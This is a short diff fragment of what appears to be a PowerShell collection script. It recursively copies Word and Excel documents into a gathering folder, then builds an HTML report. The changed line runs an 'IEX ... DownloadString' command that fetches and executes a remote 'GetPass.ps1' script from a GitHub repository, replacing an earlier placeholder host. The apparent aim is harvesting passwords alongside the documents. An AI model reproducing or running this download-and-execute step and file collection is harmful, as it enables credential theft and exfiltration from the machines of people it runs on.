@@ -2680,7 +2680,7 @@ Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $co
 Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 
-IEX (New-Object Net.WebClient).DownloadString('http://www.xxx.xxx/GetPass.ps1');
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/foryou123/sectest/master/GetPass.ps1');
 $date = get-date
 
 $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
